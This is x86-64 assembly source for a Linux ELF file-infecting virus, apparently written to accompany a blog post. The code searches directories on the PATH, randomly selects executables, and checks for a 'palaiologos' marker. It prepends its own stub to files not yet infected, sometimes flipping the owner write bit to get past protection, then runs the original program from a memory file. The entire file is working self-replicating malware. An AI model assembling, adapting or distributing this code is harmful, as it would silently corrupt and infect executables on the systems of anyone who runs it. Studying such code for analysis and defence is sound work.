format ELF64 executable
use64

; XXX: You have to set this to the resulting ELF file size manually.
SIZE equ 1434

; XXX: You have to set this to the position of the "palaiologos" string
; in the binary yourself.
SENTINEL_LOC equ 120

sys_execve equ 59
sys_open equ 2
sys_lseek equ 8
sys_memfd_create equ 319
sys_sendfile equ 40
sys_close equ 3
sys_exit equ 60
sys_getdents equ 78
sys_access equ 21
sys_stat equ 4
sys_chmod equ 90

entry _start

sentinel: db 'palaiologos',0
memfd_path: db '/proc/self/fd/',0,0
self: db '/proc/self/exe'
empty: db 0
size: dq SIZE
seed: dq 0
pathsep: db "/", 0

LCG_A equ 1103515245
LCG_B equ 12345

load_elf:
    ; Open ourselves.
    xor esi, esi
    mov edi, self
    push sys_open
    pop rax
    syscall
    ; Obtain the length: seek to back.
    mov r8, rax
    mov rdi, r8
    push sys_lseek
    pop rax
    syscall
    ; Call memfd_create, call with MFD_CLOEXEC.
    mov edi, empty
    push 1
    pop rsi
    push sys_memfd_create
    pop rax
    syscall
    ; Copy the file contents to the memfd using sendfile.
    mov edx, size
    mov r9, rax
    mov rdi, rax
    mov rsi, r8
    sub r10d, SIZE
    push sys_sendfile
    pop rax
    syscall
    ; Close the file descriptor we hold to our own binary.
    push sys_close
    pop rax
    mov rdi, r8
    syscall
    ; Bravely assume that the memfd descriptor number is a single digit.
    ; This might or might not work all of the times, but improving upon
    ; this is trivially beyond the scope of this post.
    add r9d, 48
    mov BYTE [memfd_path + 14], r9b
    ret

; The entry point.
_start:
    ; Load the argp for the payload.
    mov rdi, [rsp]
    lea rdi, [rsp+8 + rdi*8 + 8]
    call payload
    ; Load the executable to a memfd.
    call load_elf
    ; Load the path to the executable
    mov rdi, memfd_path
    ; Prepare to call execve
    ; Load argc + argv
    lea rsi, [rsp + 8]
    ; Load argp
    mov rdx, [rsp]
    lea rdx, [rsp+8 + rdx*8 + 8]
    ; Perform the syscall
    push sys_execve
    pop rax
    syscall
    ; Exit in case execve returns due to error.
    mov rdi, -1
    push sys_exit
    pop rax
    syscall

; Wants to be called with argp in rdi.
payload:
    ; Reserve a (somewhat arbitrary) amount of stack space.
    ; It needs to hold a few path buffers (3 buffers, 4096 bytes each)
    sub rsp, 12456
    ; Query the current time stamp counter as a source of randomness.
    ; rdtsc will set rdx and rax to the higher and lower bits of the time
    ; stamp counter, so we put them together and store them in the RNG seed
    ; variable.
    rdtsc
    shl rdx, 32
    or rdx, rax
    mov qword [seed], rdx
    ; Find "PATH=" in ARGP.
.path_find_loop:
    ; NULL terminates argp, check for this.
    mov rax, qword [rdi]
    test rax, rax
    je .infect_done
    ; Load the first five bytes of the current string.
    ; If any of them is NUL, we skip to the next string.
    mov cl, byte [rax]
    test cl, cl
    je .path_loop_skip
    mov dl, byte [rax + 1]
    test dl, dl
    je .path_loop_skip
    mov bl, byte [rax + 2]
    test bl, bl
    je .path_loop_skip
    mov sil, byte [rax + 3]
    test sil, sil
    je .path_loop_skip
    mov r8b, byte [rax + 4]
    test r8b, r8b
    je .path_loop_skip
    ; Check if the ASCII values are right.
    cmp cl, 'P'
    jne .path_loop_skip
    cmp dl, 'A'
    jne .path_loop_skip
    cmp bl, 'T'
    jne .path_loop_skip
    cmp sil, 'H'
    jne .path_loop_skip
    cmp r8b, '='
    je .path_found
.path_loop_skip:
    ; Go to the next pointer in the argp array.
    add rdi, 8
    jmp .path_find_loop
.path_found:
    add rax, 5
    ; Select the final path buffer.
    lea r12, [rsp + 4256]
    ; Load a few auxiliary constants.
    push 3
    pop rbx
    push sys_open
    pop r8
.path_loop:
    ; Check if we've hit the end of the PATH variable.
    mov cl, byte [rax]
    test cl, cl
    je .infect_done
    ; Copy path until : or \0 is found.
    xor r13d, r13d
.copy_path:
    test cl, cl
    je .attempt_scan
    cmp cl, ':'
    je .attempt_scan
    mov byte [rsp + r13 + 160], cl
    mov cl, byte [rax + r13 + 1]
    inc r13
    jmp .copy_path
.attempt_scan:
    ; NUL-terminate the path.
    mov ecx, r13d
    mov byte [rsp + rcx + 160], 0
    xor ecx, ecx
    ; Check if we have to skip an extra colon.
    cmp byte [rax + r13], ':'
    sete cl
    add rcx, rax
    ; Decide whether we want to infect this directory.
    ; Take a random number from a linear congruential generator
    ; and divide it by three. The modulus of zero means "no".
    imul rax, qword [seed], LCG_A
    add rax, LCG_B
    mov qword [seed], rax
    xor edx, edx
    div rbx
    test rdx, rdx
    je .next_path
    ; O_RDONLY | O_DIRECTORY
    mov esi, 0x10000
    lea rdi, [rsp + 160]
    mov rax, r8
    ; Preserve rcx through the system call.
    mov qword [rsp], rcx
    syscall
    mov rcx, qword [rsp]
    ; Clever way to determine whether the number is negative.
    bt eax, 31
    jb .next_path
    ; Save the file descriptor.
    mov qword [rsp + 8], rax
    ; Copy the file descriptor elsewhere, because we are going to use
    ; it now, and it would be a shame if a syscall clobbered it ;).
    mov rbp, rax
.getdents_loop:
    ; Load max path size.
    mov edx, 4096
    ; Load the directory file descriptor.
    mov rdi, rbp
    ; Load the buffer address.
    lea rsi, [rsp + 8352]
    push sys_getdents
    pop rax
    syscall
    ; Jump to some common error stub that will close the
    ; directory descriptor in case of failure.
    test eax, eax
    je .getdents_err
    ; Preserve the amount of entries somewhere.
    ; eax is often trashed by system calls so we want to
    ; avoid it being lost.
    mov r14d, eax
    xor eax, eax
.dir_loop:
    ; Load the current entry number, directory entries buffer
    ; and the random seed.
    mov r15d, eax
    lea rbx, [rsp + r15]
    add rbx, 8352
    mov rax, qword [seed]
.discard_loop:
    ; Done processing?
    cmp r14, r15
    jbe .getdents_loop
    ; Extract the type of the directory entry.
    movzx ecx, word [rbx + 16]
    mov dl, byte [rbx + rcx - 1]
    ; Skip if not a regular file. We will not infect symlinks.
    cmp dl, 8
    jne .give_up
    ; Invoke the LCG again. Skip the entry upfront if dividing by
    ; four gives modulus 0, that is, last two binary digits of the
    ; number are 0.
    imul rax, rax, LCG_A
    add rax, LCG_B
    mov qword [seed], rax
    test al, 3
    je .discard_loop
    ; OK, first nul-terminate the final buffer with the filename
    ; so that the `concat` function can work properly. Then append the
    ; directory name to that empty final buffer.
    mov byte [rsp + 4256], 0
    mov rdi, r12
    lea rsi, [rsp + 160]
    call concat
    ; We need to terminate the path with a slash only if it is not present
    ; already. Check this. Use a dumb strlen-ish function.
    mov rax, r12
.len_loop:
    cmp byte [rax], 0
    je .len_ok
    inc rax
    jmp .len_loop
.len_ok:
    ; Slash?
    cmp byte [rax - 1], '/'
    je .has_slash
    mov esi, pathsep
    mov rdi, r12
    call concat
.has_slash:
    ; Append the file name now.
    lea rsi, [rbx + 18]
    mov rdi, r12
    call concat
    ; Check if we can access the file for reading and writing.
    mov rdi, r12
    push 6 ; R_OK | W_OK
    pop rsi
    push sys_access
    pop rax
    syscall
    mov rcx, rax
    ; Decide whether we want to infect this file anyway.
    ; Same LCG and division stuff, except this time with the
    ; modulus of 10.
    imul rax, qword [seed], LCG_A
    add rax, LCG_B
    mov qword [seed], rax
    xor edx, edx
    push 10
    pop rsi
    div rsi
    ; Proceed only if:
    ; (1) the file is not accessible
    ; (2) we want to infect it
    ; Handle a special case here: try to add an owner
    ; write permission bit to the file and see if this lets
    ; us access it... :). Might protect against some
    ; "overzealous" (removes write permissions on critical
    ; executables to avoid problems) but not "overly paranoid"
    ; (removes write permissions /and/ transfers ownership) users.
    ; In that case we can do nothing but hope that we get root somehow.
    test ecx, ecx
    je .normal_path
    test rdx, rdx
    jne .normal_path
    ; Stat the file.
    mov rdi, r12
    lea rsi, [rsp + 16]
    push sys_stat
    pop rax
    syscall
    ; Set the owner write permission bit and call chmod.
    mov esi, dword [rsp + 40]
    or rsi, 128
    mov dword [rsp + 40], esi
    mov rbp, r12
    push sys_chmod
    pop r12
    mov rax, r12
    syscall
    ; Try to access again?
    mov rdi, rbp
    push 6 ; R_OK | W_OK again.
    pop rsi
    push sys_access
    pop rax
    syscall
    ; Still no? Restore the permissions.
    test eax, eax
    jne .restore_perms
    ; Yes => do infect.
    mov rdi, rbp
    call infect
.restore_perms:
    mov esi, dword [rsp + 40]
    and esi, -129 ; Everything except the bit 7
    mov dword [rsp + 40], esi
    mov rdi, rbp
    mov rax, r12
    syscall
    ; File still not accessible. Give up.
    ; Load the directory descriptor.
    mov rax, qword [rsp + 8]
    mov r12, rbp
    mov rbp, rax
    jmp .give_up
.normal_path:
    ; Check if we want to infect this file.
    test rdx, rdx
    jne .give_up
    ; Do infect.
    mov rdi, r12
    call infect
.give_up:
    ; We end up here when it's time to skip to
    ; the next directory entry.
    movzx ecx, word [rbx + 16]
    movzx eax, cx
    add eax, r15d
    jmp .dir_loop
.getdents_err:
    ; We get here when it's time to close the
    ; directory descriptor and move on.
    mov rdi, rbp
    push sys_close
    pop rbx
    mov rax, rbx
    syscall
    ; Load the sys_open constant again
    push sys_open
    pop r8
    mov rcx, qword [rsp]
.next_path:
    ; Go to the next path to process
    add rcx, r13
    mov rax, rcx
    jmp .path_loop
.infect_done:
    ; Balance the stack and yield.
    add rsp, 12456
    ret

concat:
    ; Find the end of the first string.
    cmp byte [rdi], 0
    lea rdi, [rdi + 1]
    jne concat
    ; Start appending characters in a loop.
    push -1
    pop rax
.do_loop:
    ; Nothing left in the source string.
    mov cl, byte [rsi + rax + 1]
    test cl, cl
    je .done
    mov byte [rdi + rax], cl
    inc rax
    jmp .do_loop
.done:
    ; Null-terminate the string.
    mov byte [rdi + rax], 0
    ret

infect:
    ; Preserve a bunch of registers that the caller function needs.
    push r15
    push r14
    push rbx
    ; Reserve enough space for the transaction buffer.
    sub rsp, 200 + SIZE
    ; Open the goat file w/ O_RDWR.
    mov rbx, sys_open
    mov rsi, rbx
    mov rax, rbx
    syscall
    ; Read the ELF header.
    mov r8d, eax
    lea rsi, [rsp - 112]
    ; Size of the ELF header.
    mov rdx, 64
    mov rdi, r8
    ; sys_read = 0
    xor eax, eax
    syscall
    ; Check machine type (AMD64, code 62)
    cmp word [rsi + 18], 62
    jne .elf_bad
    ; ELF class (64-bit)
    cmp byte [rsp - 108], 2
    jne .elf_bad
    ; Check the 0x7f ELF magic.
    cmp byte [rsp - 109], 'F'
    jne .elf_bad
    cmp byte [rsp - 110], 'L'
    jne .elf_bad
    cmp byte [rsp - 111], 'E'
    jne .elf_bad
    cmp byte [rsp - 112], 0x7F
    jne .elf_bad
    ; Rewind to the SENTINEL_LOC-th byte. We want to check
    ; if this ELF file was already infected.
    mov r9, sys_lseek
    mov rsi, SENTINEL_LOC
    mov rdi, r8
    xor edx, edx
    mov rax, r9
    syscall
    ; Read 12 bytes (length of "palaiologos\0")
    lea rsi, [rsp - 128]
    mov rdx, 12
    xor eax, eax
    syscall
    ; Check if the sentinel is present.
    movq xmm0, qword [rsi]
    movq rax, xmm0
    ; Check the first part.
    mov rcx, 'palaiolo'
    cmp rax, rcx
    jne .elf_clean
    ; Check the remaining bytes: gos\0
    cmp byte [rsp - 120], 'g'
    jne .elf_clean
    cmp byte [rsp - 119], 'o'
    jne .elf_clean
    cmp byte [rsp - 118], 's'
    jne .elf_clean
    cmp byte [rsp - 117], 0
    jne .elf_clean
.elf_bad:
    ; Close ourselves and return. Already infected.
    mov rax, 3
    mov rdi, r8
    syscall
    jmp .cleanup
.elf_clean:
    ; Open self.
    mov edi, self
    xor esi, esi
    mov rax, rbx
    syscall
    ; Open a memfd with O_CLOEXEC.
    mov r10d, eax
    mov r14, 1
    mov edi, empty
    mov eax, sys_memfd_create
    mov rsi, r14
    syscall
    ; Copy over the viral stub from ourselves to the memfd.
    mov ebx, eax
    lea r15, [rsp - 48]
    mov edx, SIZE
    mov rdi, r10
    mov rsi, r15
    xor eax, eax
    syscall
    mov edx, SIZE
    mov rdi, rbx
    mov rax, r14
    syscall
    ; Seek to the beginning of the goat file (we want the ELf header back).
    mov rdi, r8
    xor esi, esi
    xor edx, edx
    mov rax, r9
    syscall
    ; Copy data from the goat file to the memfd in a loop.
.copy_goat_memfd:
    mov edx, SIZE
    mov rdi, r8
    mov rsi, r15
    xor eax, eax
    syscall
    test eax, eax
    je .copy_goat_memfd_done
    mov edx, eax
    mov rdi, rbx
    mov rsi, r15
    mov rax, r14
    syscall
    jmp .copy_goat_memfd
    ; Rewind the goat file and the memfd.
.copy_goat_memfd_done:
    mov rdi, rbx
    xor esi, esi
    xor edx, edx
    mov rax, r9
    syscall
    mov rdi, r8
    xor esi, esi
    xor edx, edx
    mov rax, r9
    syscall
    ; Overwrite the goat file with the memfd contents.
    lea rsi, [rsp - 48]
.copy_memfd_goat:
    mov edx, SIZE
    mov rdi, rbx
    xor eax, eax
    syscall
    test eax, eax
    je .copy_memfd_goat_done
    mov edx, eax
    mov rdi, r8
    mov rax, r14
    syscall
    jmp .copy_memfd_goat
.copy_memfd_goat_done:
    ; Close goat, memfd, and self.
    mov rdx, sys_close
    mov rdi, rbx
    mov rax, rdx
    syscall
    mov rdi, r8
    mov rax, rdx
    syscall
    mov rdi, r10
    mov rax, rdx
    syscall
.cleanup:
    ; Balance the stack and quit.
    add rsp, 200 + SIZE
    pop rbx
    pop r14
    pop r15
    ret
